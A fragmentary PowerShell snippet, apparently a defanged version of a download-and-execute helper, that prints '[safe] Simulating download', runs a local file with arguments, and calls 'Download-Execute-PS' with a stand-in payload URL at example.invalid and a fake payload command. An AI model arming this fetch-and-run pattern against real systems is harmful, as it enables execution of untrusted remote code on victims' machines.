...
'@
        ...
        echo "[safe] Simulating download to $filePath from $ScriptURL"
        if ($Arguments) {
            & $filePath $Arguments
        }
        else {
...
Download-Execute-PS `
    -ScriptURL ([string]"https://example.invalid/payload.ps1") `
    -Arguments ([string]"Invoke-FakePayload -Message 'hello'") `
    -NoDownload<#$Null#>
